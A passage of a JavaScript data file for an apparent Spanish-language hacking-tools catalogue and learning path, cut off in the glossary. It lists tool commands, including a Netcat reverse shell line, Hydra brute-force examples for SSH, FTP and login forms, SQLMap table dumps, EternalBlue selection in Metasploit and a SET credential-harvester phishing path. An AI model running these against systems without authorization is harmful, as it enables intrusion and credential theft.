const DATA = {
  tools: [
    // === RECONOCIMIENTO ===
    {
      id: 'nmap', name: 'Nmap', category: 'recon', icon: '🌐',
      catLabel: 'Reconocimiento',
      desc: 'Escáner de puertos y descubrimiento de red. Fundamental para mapear redes, identificar servicios activos, SO y versiones.',
      ethicalDesc: 'Úsalo solo en redes propias o con autorización. Escanear sin permiso es ilegal.',
      commands: [
        { label: 'Escaneo básico', cmd: 'nmap -sV <target>' },
        { label: 'Escaneo sigiloso SYN', cmd: 'nmap -sS -T4 <target>' },
        { label: 'Detectar SO y servicios', cmd: 'nmap -O -sV <target>' },
        { label: 'Escaneo red local', cmd: 'nmap -sn 192.168.1.0/24' },
        { label: 'Todos los puertos', cmd: 'nmap -p- <target>' }
      ],
      install: 'pkg install nmap',
      termux: true, platform: 'Linux, Win, macOS, Android (Termux)',
      url: 'https://nmap.org',
      downloadUrl: 'https://nmap.org/download.html',
      downloadLabel: 'nmap.org/download'
    },
    {
      id: 'nikto', name: 'Nikto', category: 'recon', icon: '🔍',
      catLabel: 'Reconocimiento',
      desc: 'Escáner de servidores web. Detecta 6700+ archivos peligrosos, configuraciones incorrectas y versiones desactualizadas.',
      ethicalDesc: 'Requiere autorización explícita del propietario.',
      commands: [
        { label: 'Escaneo básico', cmd: 'nikto -h <target>' },
        { label: 'Con SSL', cmd: 'nikto -h https://<target>' },
        { label: 'Puerto específico', cmd: 'nikto -h <target> -p 8080' },
        { label: 'Guardar reporte', cmd: 'nikto -h <target> -o reporte.html' }
      ],
      install: 'pkg install nikto',
      termux: true, platform: 'Linux, Android (Termux), Win (WSL)',
      url: 'https://github.com/sullo/nikto',
      downloadUrl: 'https://github.com/sullo/nikto/releases',
      downloadLabel: 'GitHub Releases'
    },
    {
      id: 'wpscan', name: 'WPScan', category: 'recon', icon: '🔐',
      catLabel: 'Reconocimiento',
      desc: 'Escáner de seguridad especializado en WordPress. Detecta plugins vulnerables, temas obsoletos y usuarios.',
      ethicalDesc: 'Solo contra sitios propios o con autorización.',
      commands: [
        { label: 'Escaneo básico', cmd: 'wpscan --url <target>' },
        { label: 'Enumerar usuarios', cmd: 'wpscan --url <target> --enumerate u' },
        { label: 'Plugins vulnerables', cmd: 'wpscan --url <target> --enumerate vp' },
        { label: 'Modo agresivo', cmd: 'wpscan --url <target> --plugins-detection aggressive' }
      ],
      install: 'gem install wpscan',
      termux: true, platform: 'Linux, Android (Termux), macOS, Win (WSL)',
      url: 'https://wpscan.com',
      downloadUrl: 'https://wpscan.com/register',
      downloadLabel: 'wpscan.com'
    },
    {
      id: 'sublist3r', name: 'Sublist3r', category: 'recon', icon: '📡',
      catLabel: 'Reconocimiento',
      desc: 'Enumeración de subdominios usando OSINT. Busca en Google, Yahoo, Bing y más fuentes.',
      ethicalDesc: 'Útil en pentesting autorizado para mapear superficie de ataque.',
      commands: [
        { label: 'Enumerar subdominios', cmd: 'sublist3r -d <dominio>' },
        { label: 'Usar todos los motores', cmd: 'sublist3r -d <dominio> -b' },
        { label: 'Guardar resultados', cmd: 'sublist3r -d <dominio> -o subs.txt' }
      ],
      install: 'pip install sublist3r',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://github.com/aboul3la/Sublist3r',
      downloadUrl: 'https://github.com/aboul3la/Sublist3r',
      downloadLabel: 'GitHub'
    },
    {
      id: 'amass', name: 'Amass', category: 'recon', icon: '🗺️',
      catLabel: 'Reconocimiento',
      desc: 'Mapeo de superficie de ataque. Descubre subdominios, IPs y certificados usando scraping y APIs.',
      commands: [
        { label: 'Enumeración básica', cmd: 'amass enum -d <dominio>' },
        { label: 'Enumeración pasiva', cmd: 'amass enum -passive -d <dominio>' },
        { label: 'Mapeo visual', cmd: 'amass viz -d <dominio>' }
      ],
      install: 'pkg install amass',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://github.com/owasp-amass/amass',
      downloadUrl: 'https://github.com/owasp-amass/amass/releases',
      downloadLabel: 'GitHub Releases'
    },

    // === ESCANEO WEB ===
    {
      id: 'zap', name: 'OWASP ZAP', category: 'web', icon: '🛡️',
      catLabel: 'Escaneo Web',
      desc: 'Proxy de intercepción y escáner de vulnerabilidades web. Detecta SQLi, XSS, CSRF y más. Estándar OWASP.',
      ethicalDesc: 'Estándar OWASP para testing. Siempre con autorización. Ideal para CI/CD.',
      commands: [
        { label: 'Escaneo CLI', cmd: 'zap-cli quick-scan --self-contained --start-options "-config api.disablekey=true" <url>' },
        { label: 'Spider automático', cmd: 'zap-cli spider <url>' },
        { label: 'Escaneo activo', cmd: 'zap-cli active-scan <url>' },
        { label: 'Reporte PDF', cmd: 'zap-cli report -o reporte.pdf -f pdf' }
      ],
      install: 'pkg install zap (o descargar desde web)',
      termux: false, platform: 'Win, Linux, macOS (requiere Java)',
      url: 'https://www.zaproxy.org',
      downloadUrl: 'https://www.zaproxy.org/download/',
      downloadLabel: 'zaproxy.org/download'
    },
    {
      id: 'burp', name: 'Burp Suite', category: 'web', icon: '🔬',
      catLabel: 'Escaneo Web',
      desc: 'Proxy de intercepción para pruebas de seguridad web. Community gratuita con Repeater, Intruder demo y Decoder.',
      ethicalDesc: 'Community Edition es excelente para aprender. Usar en laboratorios propios.',
      commands: [
        { label: 'Configurar proxy', cmd: 'Proxy en 127.0.0.1:8080 -> Cert en http://burpsuite' },
        { label: 'Repeater', cmd: 'Click derecho > Send to Repeater' },
        { label: 'Intruder', cmd: 'Posicionar payload > Add § > Start attack' },
        { label: 'Decoder', cmd: 'Pestaña Decoder > Input > Encode/Decode' }
      ],
      install: 'Descargar desde portswigger.net',
      termux: false, platform: 'Win, Linux, macOS (requiere Java)',
      url: 'https://portswigger.net/burp',
      downloadUrl: 'https://portswigger.net/burp/communitydownload',
      downloadLabel: 'PortSwigger (Community)'
    },
    {
      id: 'gobuster', name: 'Gobuster', category: 'web', icon: '📂',
      catLabel: 'Escaneo Web',
      desc: 'Fuerza bruta de directorios web, subdominios DNS y buckets S3. Extremadamente rápido.',
      ethicalDesc: 'Útil en pentesting autorizado para descubrir rutas ocultas.',
      commands: [
        { label: 'Descubrir directorios', cmd: 'gobuster dir -u <url> -w wordlist.txt' },
        { label: 'Subdominios DNS', cmd: 'gobuster dns -d <dominio> -w subs.txt' },
        { label: 'Con extensiones', cmd: 'gobuster dir -u <url> -w words.txt -x php,txt,html' }
      ],
      install: 'pkg install gobuster',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://github.com/OJ/gobuster',
      downloadUrl: 'https://github.com/OJ/gobuster/releases/latest',
      downloadLabel: 'GitHub Releases'
    },
    {
      id: 'dirb', name: 'Dirb', category: 'web', icon: '📁',
      catLabel: 'Escaneo Web',
      desc: 'Escáner de contenido web basado en diccionario. Encuentra directorios y archivos ocultos.',
      commands: [
        { label: 'Escaneo básico', cmd: 'dirb <url>' },
        { label: 'Con extensión', cmd: 'dirb <url> -X .php' },
        { label: 'Wordlist personalizada', cmd: 'dirb <url> /ruta/wordlist.txt' }
      ],
      install: 'pkg install dirb',
      termux: true, platform: 'Linux, Android (Termux)',
      url: 'https://dirb.sourceforge.net',
      downloadUrl: 'https://dirb.sourceforge.net',
      downloadLabel: 'SourceForge'
    },

    // === REDES ===
    {
      id: 'wireshark', name: 'Wireshark', category: 'network', icon: '📊',
      catLabel: 'Redes',
      desc: 'Analizador de protocolos de red. Captura y examina tráfico en tiempo real.',
      ethicalDesc: 'Monitorear redes sin permiso es ilegal. Solo en tu propia red.',
      commands: [
        { label: 'Capturar en interfaz', cmd: 'tshark -i eth0' },
        { label: 'Filtrar HTTP', cmd: 'tshark -Y "http.request"' },
        { label: 'Filtrar por IP', cmd: 'tshark -Y "ip.addr == 192.168.1.1"' },
        { label: 'Guardar captura', cmd: 'tshark -i eth0 -w captura.pcapng' }
      ],
      install: 'pkg install wireshark (tshark CLI)',
      termux: true, platform: 'Linux, Android (Termux CLI), Win, macOS',
      url: 'https://www.wireshark.org',
      downloadUrl: 'https://www.wireshark.org/download.html',
      downloadLabel: 'wireshark.org/download'
    },
    {
      id: 'tcpdump', name: 'TCPDump', category: 'network', icon: '📡',
      catLabel: 'Redes',
      desc: 'Sniffer de paquetes por CLI. Ligero y potente, ideal para servidores sin GUI.',
      commands: [
        { label: 'Capturar todo', cmd: 'tcpdump -i eth0' },
        { label: 'Puerto específico', cmd: 'tcpdump -i eth0 port 80' },
        { label: 'Guardar captura', cmd: 'tcpdump -i eth0 -w captura.pcap' },
        { label: 'Leer .pcap', cmd: 'tcpdump -r captura.pcap' }
      ],
      install: 'pkg install tcpdump',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://www.tcpdump.org',
      downloadUrl: 'https://www.tcpdump.org',
      downloadLabel: 'tcpdump.org'
    },
    {
      id: 'netcat', name: 'Netcat', category: 'network', icon: '🔌',
      catLabel: 'Redes',
      desc: 'Navaja suiza de conexiones TCP/UDP. Ideal para debugging, banners y reverse shells.',
      ethicalDesc: 'Reverse shells solo en entornos controlados.',
      commands: [
        { label: 'Escaneo de puertos', cmd: 'nc -zv <target> 20-80' },
        { label: 'Banner de servicio', cmd: 'nc -v <target> 80' },
        { label: 'Reverse shell', cmd: 'nc -e /bin/sh <tu-ip> 4444' },
        { label: 'Escuchar conexión', cmd: 'nc -lvnp 4444' }
      ],
      install: 'pkg install netcat-openbsd',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://nc110.sourceforge.io',
      downloadUrl: 'https://nc110.sourceforge.io',
      downloadLabel: 'SourceForge'
    },

    // === VULNERABILIDADES ===
    {
      id: 'openvas', name: 'OpenVAS / Greenbone', category: 'vuln', icon: '💉',
      catLabel: 'Vulnerabilidades',
      desc: 'Escáner completo de vulnerabilidades con 100,000+ CVEs. Incluye reportes detallados.',
      ethicalDesc: 'Sistema enterprise de gestión de vulnerabilidades. Siempre con autorización.',
      commands: [
        { label: 'Iniciar servicio', cmd: 'gvm-start' },
        { label: 'Parar servicio', cmd: 'gvm-stop' },
        { label: 'Escaneo por consola', cmd: 'gvm-cli socket --xml "<create_task/>"' }
      ],
      install: 'pkg install openvas (o VM en Win)',
      termux: true, platform: 'Linux, Android (Termux), Win (VM)',
      url: 'https://www.greenbone.net',
      downloadUrl: 'https://www.greenbone.net/en/greenbone-free/',
      downloadLabel: 'Greenbone FREE (OVA)'
    },
    {
      id: 'nuclei', name: 'Nuclei', category: 'vuln', icon: '🧬',
      catLabel: 'Vulnerabilidades',
      desc: 'Escáner rápido basado en templates YAML. Comunidad activa con miles de plantillas.',
      ethicalDesc: 'Verificar permiso antes de escanear.',
      commands: [
        { label: 'Escaneo básico', cmd: 'nuclei -u <url>' },
        { label: 'Todos los templates', cmd: 'nuclei -u <url> -t nuclei-templates/' },
        { label: 'Tecnologías', cmd: 'nuclei -u <url> -tags tech' },
        { label: 'Reporte JSON', cmd: 'nuclei -u <url> -json -o resultados.json' }
      ],
      install: 'pkg install nuclei',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://nuclei.projectdiscovery.io',
      downloadUrl: 'https://github.com/projectdiscovery/nuclei/releases/latest',
      downloadLabel: 'GitHub Releases'
    },

    // === PASSWORDS & CRYPTO ===
    {
      id: 'hashcat', name: 'Hashcat', category: 'password', icon: '⚡',
      catLabel: 'Passwords & Crypto',
      desc: 'Recuperador de contraseñas basado en GPU. Soporta cientos de algoritmos.',
      ethicalDesc: 'Solo para recuperar tus propias contraseñas o auditorías autorizadas.',
      commands: [
        { label: 'Diccionario MD5', cmd: 'hashcat -m 0 -a 0 hashes.txt wordlist.txt' },
        { label: 'Con reglas', cmd: 'hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules/best64.rule' },
        { label: 'Fuerza bruta', cmd: 'hashcat -m 1400 -a 3 hashes.txt ?a?a?a?a?a?a' }
      ],
      install: 'pkg install hashcat',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://hashcat.net',
      downloadUrl: 'https://hashcat.net/hashcat/',
      downloadLabel: 'hashcat.net'
    },
    {
      id: 'john', name: 'John the Ripper', category: 'password', icon: '🔓',
      catLabel: 'Passwords & Crypto',
      desc: 'Auditor de contraseñas multi-plataforma. Detecta tipos de hash automáticamente.',
      commands: [
        { label: 'Crackear hashes', cmd: 'john --wordlist=wordlist.txt hashes.txt' },
        { label: 'Mostrar resultados', cmd: 'john --show hashes.txt' },
        { label: 'Con reglas', cmd: 'john --wordlist=wordlist.txt --rules hashes.txt' }
      ],
      install: 'pkg install john',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://www.openwall.com/john',
      downloadUrl: 'https://www.openwall.com/john/',
      downloadLabel: 'openwall.com/john'
    },
    {
      id: 'hydra', name: 'Hydra', category: 'password', icon: '🐍',
      catLabel: 'Passwords & Crypto',
      desc: 'Fuerza bruta para servicios de red. Soporta SSH, FTP, HTTP, MySQL, RDP, SMB y 50+ protocolos.',
      ethicalDesc: 'Solo contra servicios propios o con autorización. Forzar acceso es delito.',
      commands: [
        { label: 'Fuerza bruta SSH', cmd: 'hydra -l admin -P passwords.txt ssh://<target>' },
        { label: 'Fuerza bruta FTP', cmd: 'hydra -L users.txt -P passwords.txt ftp://<target>' },
        { label: 'HTTP POST form', cmd: 'hydra -l admin -P passwords.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"' }
      ],
      install: 'pkg install hydra',
      termux: true, platform: 'Linux, Android (Termux), Win (Cygwin)',
      url: 'https://github.com/vanhauser-thc/thc-hydra',
      downloadUrl: 'https://github.com/vanhauser-thc/thc-hydra/releases',
      downloadLabel: 'GitHub Releases'
    },

    // === OSINT ===
    {
      id: 'theharvester', name: 'theHarvester', category: 'osint', icon: '🌍',
      catLabel: 'OSINT',
      desc: 'Recolector de correos, subdominios, IPs y URLs usando motores de búsqueda y APIs.',
      ethicalDesc: 'Información pública. Cumplir términos de servicio.',
      commands: [
        { label: 'Buscar correos', cmd: 'theHarvester -d <dominio> -b google' },
        { label: 'Múltiples fuentes', cmd: 'theHarvester -d <dominio> -b google,linkedin,bing' },
        { label: 'Incluir IPs', cmd: 'theHarvester -d <dominio> -b all' }
      ],
      install: 'pip install theHarvester',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://github.com/laramies/theHarvester',
      downloadUrl: 'https://github.com/laramies/theHarvester',
      downloadLabel: 'GitHub'
    },
    {
      id: 'sherlock', name: 'Sherlock', category: 'osint', icon: '🕵️',
      catLabel: 'OSINT',
      desc: 'Encuentra nombres de usuario en 400+ redes sociales. Ideal para OSINT.',
      ethicalDesc: 'Información pública. Útil para verificar huella digital propia.',
      commands: [
        { label: 'Buscar usuario', cmd: 'sherlock <username>' },
        { label: 'Guardar resultados', cmd: 'sherlock <username> --output resultados/' },
        { label: 'Redes específicas', cmd: 'sherlock <username> --site instagram --site twitter' }
      ],
      install: 'pip install sherlock-project',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://github.com/sherlock-project/sherlock',
      downloadUrl: 'https://github.com/sherlock-project/sherlock',
      downloadLabel: 'GitHub'
    },
    {
      id: 'shodan', name: 'Shodan', category: 'osint', icon: '🔎',
      catLabel: 'OSINT',
      desc: 'Buscador de dispositivos conectados a Internet. Encuentra servidores, cámaras, routers, PLCs.',
      ethicalDesc: 'Información pública indexada. No acceder sin autorización.',
      commands: [
        { label: 'Buscar servicio', cmd: 'shodan search "apache" --limit 10' },
        { label: 'Buscar puerto', cmd: 'shodan search "port:22" --limit 10' },
        { label: 'Info de IP', cmd: 'shodan host <ip>' },
        { label: 'Vulnerabilidades', cmd: 'shodan search "vuln:cve-2021-41773"' }
      ],
      install: 'pip install shodan (requiere API key)',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://www.shodan.io',
      downloadUrl: 'https://cli.shodan.io/',
      downloadLabel: 'Install Guide'
    },

    // === EXPLOTACIÓN ===
    {
      id: 'metasploit', name: 'Metasploit', category: 'exploit', icon: '💥',
      catLabel: 'Explotación',
      desc: 'Framework de explotación más completo. Miles de exploits, payloads y post-explotación.',
      ethicalDesc: 'Extremadamente poderoso. Solo en entornos autorizados.',
      commands: [
        { label: 'Iniciar consola', cmd: 'msfconsole' },
        { label: 'Buscar exploit', cmd: 'search eternalblue' },
        { label: 'Usar exploit', cmd: 'use exploit/windows/smb/ms17_010_eternalblue' },
        { label: 'Mostrar opciones', cmd: 'show options' }
      ],
      install: 'pkg install metasploit',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://www.metasploit.com',
      downloadUrl: 'https://windows.metasploit.com/metasploitframework-latest.msi',
      downloadLabel: 'Windows MSI / Termux'
    },
    {
      id: 'searchsploit', name: 'Searchsploit', category: 'exploit', icon: '📖',
      catLabel: 'Explotación',
      desc: 'Buscador offline de exploits de Exploit-DB. 50,000+ exploits sin conexión.',
      commands: [
        { label: 'Buscar exploit', cmd: 'searchsploit wordpress 5.0' },
        { label: 'Buscar por CVE', cmd: 'searchsploit cve-2021-41773' },
        { label: 'Copiar exploit', cmd: 'searchsploit -m exploits/php/webapps/12345.php' }
      ],
      install: 'pkg install exploitdb (o git clone en Termux)',
      termux: true, platform: 'Linux, Android (Termux), Win (WSL)',
      url: 'https://www.exploit-db.com',
      downloadUrl: 'https://gitlab.com/exploit-database/exploitdb',
      downloadLabel: 'GitLab'
    },
    {
      id: 'sqlmap', name: 'SQLMap', category: 'exploit', icon: '🗄️',
      catLabel: 'Explotación',
      desc: 'Detección y explotación automatizada de SQL Injection. Soporta la mayoría de bases de datos.',
      ethicalDesc: 'Puede dañar BD si se usa incorrectamente. Solo testing autorizado.',
      commands: [
        { label: 'Detectar SQLi', cmd: 'sqlmap -u "http://target.com/page?id=1"' },
        { label: 'Extraer DBs', cmd: 'sqlmap -u "http://target.com/page?id=1" --dbs' },
        { label: 'Tablas de DB', cmd: 'sqlmap -u "http://target.com/page?id=1" -D db --tables' },
        { label: 'Dump de tabla', cmd: 'sqlmap -u "http://target.com/page?id=1" -D db -T users --dump' }
      ],
      install: 'pip install sqlmap',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://sqlmap.org',
      downloadUrl: 'https://sqlmap.org/#download',
      downloadLabel: 'sqlmap.org'
    },
    {
      id: 'beef', name: 'BeEF', category: 'exploit', icon: '🎣',
      catLabel: 'Explotación',
      desc: 'Browser Exploitation Framework. Una vez que el objetivo "muerde el anzuelo", ejecutas módulos.',
      ethicalDesc: 'Requiere que el objetivo visite tu página hook.',
      commands: [
        { label: 'Iniciar BeEF', cmd: 'beef-xss' },
        { label: 'Panel de control', cmd: 'http://localhost:3000/ui/panel' }
      ],
      install: 'pkg install beef-xss',
      termux: true, platform: 'Linux, Android (Termux)',
      url: 'https://beefproject.com',
      downloadUrl: 'https://github.com/beefproject/beef',
      downloadLabel: 'GitHub'
    },

    // === PRIVACIDAD ===
    {
      id: 'tor', name: 'Tor Browser', category: 'privacy', icon: '🧅',
      catLabel: 'Privacidad & Anonimato',
      desc: 'Navegador que enruta tráfico por la red Tor. Oculta IP y evita vigilancia.',
      ethicalDesc: 'Herramienta de privacidad legítima. No es ilegal usarlo.',
      commands: [
        { label: 'Iniciar Tor', cmd: 'tor' },
        { label: 'Verificar conexión', cmd: 'curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip' },
        { label: 'Navegador Tor', cmd: 'Descargar de torproject.org (también en F-Droid)' }
      ],
      install: 'pkg install tor',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://www.torproject.org',
      downloadUrl: 'https://www.torproject.org/download/',
      downloadLabel: 'torproject.org/download'
    },
    {
      id: 'proxychains', name: 'Proxychains', category: 'privacy', icon: '🔗',
      catLabel: 'Privacidad & Anonimato',
      desc: 'Obliga a cualquier app a usar proxies. Ideal para encadenar múltiples proxies (Tor, SOCKS, HTTP).',
      ethicalDesc: 'No oculta actividades ilegales.',
      commands: [
        { label: 'Ejecutar por proxy', cmd: 'proxychains nmap -sT <target>' },
        { label: 'Con Tor', cmd: 'proxychains firefox' },
        { label: 'Configurar', cmd: 'echo "socks4 127.0.0.1 9050" >> proxychains.conf' }
      ],
      install: 'pkg install proxychains-ng',
      termux: true, platform: 'Linux, Android (Termux), Win (alternativas)',
      url: 'https://github.com/rofl0r/proxychains-ng',
      downloadUrl: 'https://github.com/rofl0r/proxychains-ng',
      downloadLabel: 'GitHub'
    },

    // === MOVIL ===
    {
      id: 'masvs', name: 'OWASP MASVS', category: 'mobile', icon: '📱',
      catLabel: 'Seguridad Móvil',
      desc: 'Mobile Application Security Verification Standard. Estándar OWASP para apps móviles.',
      ethicalDesc: 'Estándar de seguridad. Úsalo para auditar tus propias apps.',
      commands: [
        { label: 'MASVS v2.0', cmd: 'github.com/OWASP/owasp-masvs' },
        { label: 'Checklist', cmd: 'Revisar MASVS en GitHub' },
        { label: 'MSTG Guía', cmd: 'github.com/OWASP/owasp-mstg' }
      ],
      install: 'PDF/Web - no requiere instalación',
      termux: false, platform: 'Documentación (Web/PDF)',
      url: 'https://mas.owasp.org',
      downloadUrl: 'https://github.com/OWASP/owasp-masvs',
      downloadLabel: 'GitHub OWASP MASVS'
    },
    {
      id: 'mobsf', name: 'MobSF', category: 'mobile', icon: '📲',
      catLabel: 'Seguridad Móvil',
      desc: 'Mobile Security Framework. Análisis automatizado de apps Android/iOS/Windows.',
      ethicalDesc: 'Audita tus propias apps.',
      commands: [
        { label: 'Iniciar MobSF', cmd: 'python manage.py runserver 0.0.0.0:8000' },
        { label: 'Analizar APK', cmd: 'Subir APK desde interfaz web :8000' },
        { label: 'API upload', cmd: 'curl -F "file=@app.apk" http://localhost:8000/api/v1/upload' }
      ],
      install: 'git clone + setup.py (ver web)',
      termux: false, platform: 'Linux, Win, macOS (Python)',
      url: 'https://github.com/MobSF/Mobile-Security-Framework-MobSF',
      downloadUrl: 'https://github.com/MobSF/Mobile-Security-Framework-MobSF',
      downloadLabel: 'GitHub'
    },
    {
      id: 'apktool', name: 'APKTool', category: 'mobile', icon: '🔧',
      catLabel: 'Seguridad Móvil',
      desc: 'Reverse engineering para APKs. Decompila recursos y código Smali.',
      ethicalDesc: 'Auditar tus propias apps o con permiso explícito.',
      commands: [
        { label: 'Decompilar APK', cmd: 'apktool d app.apk' },
        { label: 'Recompilar APK', cmd: 'apktool b app-directorio' },
        { label: 'Firmar APK', cmd: 'jarsigner -keystore my.keystore app-dist.apk alias' }
      ],
      install: 'pkg install apktool',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://apktool.org',
      downloadUrl: 'https://apktool.org/docs/install/',
      downloadLabel: 'apktool.org'
    },
    {
      id: 'jadx', name: 'JADX', category: 'mobile', icon: '📄',
      catLabel: 'Seguridad Móvil',
      desc: 'Descompilador de DEX a Java. Convierte APKs en código Java legible.',
      commands: [
        { label: 'Descompilar APK', cmd: 'jadx -d output/ app.apk' },
        { label: 'Con recursos', cmd: 'jadx --show-bad-code -d output/ app.apk' }
      ],
      install: 'pkg install jadx',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://github.com/skylot/jadx',
      downloadUrl: 'https://github.com/skylot/jadx/releases/tag/v1.5.4',
      downloadLabel: 'GitHub Releases (Win .exe)'
    },

    // === FORENSE ===
    {
      id: 'autopsy', name: 'Autopsy', category: 'forensic', icon: '🔬',
      catLabel: 'Forense Digital',
      desc: 'Plataforma de análisis forense digital con GUI. Recupera archivos, extrae metadatos.',
      ethicalDesc: 'Solo en sistemas propios o investigaciones autorizadas.',
      commands: [
        { label: 'Crear caso', cmd: 'Autopsy GUI -> New Case' },
        { label: 'Analizar imagen', cmd: 'autopsy --img /ruta/imagen.dd' }
      ],
      install: 'Descargar desde web (no disponible en Termux)',
      termux: false, platform: 'Win, Linux, macOS',
      url: 'https://www.sleuthkit.org/autopsy',
      downloadUrl: 'https://www.sleuthkit.org/autopsy/download.php',
      downloadLabel: 'sleuthkit.org'
    },
    {
      id: 'foremost', name: 'Foremost', category: 'forensic', icon: '♻️',
      catLabel: 'Forense Digital',
      desc: 'Recupera archivos borrados por cabeceras (file carving). 20+ formatos.',
      commands: [
        { label: 'Recuperar archivos', cmd: 'foremost -i imagen.dd -o output/' },
        { label: 'Tipos específicos', cmd: 'foremost -t jpeg,png,pdf -i imagen.dd -o output/' }
      ],
      install: 'pkg install foremost',
      termux: true, platform: 'Linux, Android (Termux)',
      url: 'https://foremost.sourceforge.io',
      downloadUrl: 'https://foremost.sourceforge.io',
      downloadLabel: 'SourceForge'
    },

    // === ING. SOCIAL ===
    {
      id: 'set', name: 'SET - Social Engineering Toolkit', category: 'social', icon: '🎭',
      catLabel: 'Ingeniería Social',
      desc: 'Framework de ingeniería social. Phishing, clonación de sitios, payloads.',
      ethicalDesc: 'El phishing sin permiso es ilegal. Solo pruebas autorizadas.',
      commands: [
        { label: 'Iniciar SET', cmd: 'setoolkit' },
        { label: 'Phishing', cmd: '1) Social Engineering > 2) Website Attack > 3) Credential Harvester' }
      ],
      install: 'pkg install setoolkit',
      termux: true, platform: 'Linux, Android (Termux)',
      url: 'https://github.com/trustedsec/social-engineer-toolkit',
      downloadUrl: 'https://github.com/trustedsec/social-engineer-toolkit',
      downloadLabel: 'GitHub'
    }
  ],

  learning: [
    {
      level: 0, title: 'Fundamentos', subtitle: 'Los pilares de la ciberseguridad',
      icon: '📚', topics: [
        'Comprender el modelo OSI y TCP/IP',
        'Conceptos básicos de redes (IP, puertos, protocolos)',
        'Comandos esenciales de Linux (navegación, permisos, procesos)',
        'Entender HTTP/HTTPS: métodos, cabeceras, cookies',
        'Conceptos de DNS: cómo funciona, tipos de registros',
        'Introducción a la terminal y scripting básico',
        'Cifrado simétrico vs asimétrico',
        'Ética y legalidad en ciberseguridad'
      ]
    },
    {
      level: 1, title: 'Reconocimiento OSINT', subtitle: 'Recolectar información sin tocar el objetivo',
      icon: '🔍', topics: [
        'Nmap: Escaneo de puertos y detección de servicios',
        'theHarvester: Recolección de correos y subdominios',
        'Sherlock: Buscar usuarios en redes sociales',
        'Shodan: Buscador de dispositivos IoT',
        'Amass / Sublist3r: Enumeración de subdominios',
        'Wappalyzer / WhatWeb: Identificar tecnologías web',
        'Google Dorks: Búsquedas avanzadas en Google',
        'Nikto: Escaneo básico de servidores web',
        'Certificado SSL: Buscar en crt.sh'
      ]
    },
    {
      level: 2, title: 'Escaneo y Enumeración Web', subtitle: 'Mapear la superficie de ataque',
      icon: '🛡️', topics: [
        'OWASP ZAP: Proxy y escáner automatizado',
        'Burp Suite: Interceptar y modificar peticiones',
        'Dirb / Gobuster: Descubrir directorios ocultos',
        'WPScan: Auditoría de WordPress',
        'Nuclei: Escaneo con templates de vulnerabilidades',
        'Identificar parámetros y endpoints',
        'Enumerar usuarios y versiones',
        'Revisar archivos robots.txt y sitemap.xml',
        'Fingerprinting de servidores web'
      ]
    },
    {
      level: 3, title: 'Explotación Básica', subtitle: 'Identificar y explotar vulnerabilidades comunes',
      icon: '💥', topics: [
        'SQL Injection Manual y con SQLMap',
        'Cross-Site Scripting (XSS): Reflejado, Almacenado, DOM',
        'Local/Remote File Inclusion (LFI/RFI)',
        'Cross-Site Request Forgery (CSRF)',
        'Fuerza bruta con Hydra en servicios',
        'Subida de archivos maliciosos',
        'Command Injection',
        'Server-Side Request Forgery (SSRF)',
        'Uso de Searchsploit para encontrar exploits'
      ]
    },
    {
      level: 4, title: 'Explotación Avanzada', subtitle: 'Metasploit, post-explotación y movimientos laterales',
      icon: '🧬', topics: [
        'Metasploit Framework: Módulos y payloads',
        'Creación de payloads con MSFVenom',
        'Reverse shells y bind shells',
        'Escalada de privilegios en Linux (SUID, cron, kernel)',
        'Escalada de privilegios en Windows (Token, UAC bypass)',
        'Movimiento lateral en la red',
        'Pivoting y tunneling',
        'Persistencia en sistemas comprometidos',
        'BeEF: Explotación del navegador'
      ]
    },
    {
      level: 5, title: 'Especialización', subtitle: 'Ramas avanzadas de la ciberseguridad',
      icon: '🎯', topics: [
        'Seguridad Móvil: OWASP MASVS, MobSF, APKTool, JADX',
        'Reverse Engineering de APKs',
        'Cloud Security: AWS, Azure, GCP hardening',
        'Blockchain y Smart Contract auditing',
        'Forense Digital: Autopsy, Volatility, Foremost',
        'Ingeniería Social: SET, Gophish',
        'Active Directory: Kerberos, ACLs, BloodHound',
        'Web3 Security: Flash loans, rug pulls, smart contract vulns',
        'Bug Bounty: Cómo empezar, plataformas, reporting'
      ]
    }
  ],

  glossary: [
    { term: 'CVE', def: 'Common Vulnerabilities and Exposures. Identificador único para vulnerabilidades de seguridad conocidas públicamente.' },
    { term: 'CVSS', def: 'Common Vulnerability Scoring System. Sistema de puntuación (0-10) que mide la severidad de una vulnerabilidad.' },
    { term: '0-Day', def: 'Vulnerabilidad desconocida para el público o el fabricante. No existe parche disponible.' },
    { term: 'XSS', def: 'Cross-Site Scripting. Vulnerabilidad que permite inyectar scripts maliciosos en páginas web visitadas por otros usuarios.' },
    { term: 'SQLi', def: 'SQL Injection. Inyección de comandos SQL a través de inputs del usuario para manipular bases de datos.' },
    { term: 'RCE', def: 'Remote Code Execution. Vulnerabilidad que permite ejecutar código arbitrario en un sistema remoto.' },
    { term: 'LFI/RFI', def: 'Local/Remote File Inclusion. Permite incluir archivos locales o remotos en una aplicación, frecuentemente llevando a RCE.' },
    { term: 'OSINT', def: 'Open Source Intelligence. Recolección de información de fuentes públicas como redes sociales, motores de búsqueda y registros DNS.' },
    { term: 'Pentest', def: 'Penetration Test. Prueba de seguridad autorizada que simula un ataque real para identificar vulnerabilidades.' },
    { term: 'POC', def: 'Proof of Concept. Demostración práctica que prueba la existencia de una vulnerabilidad.' },
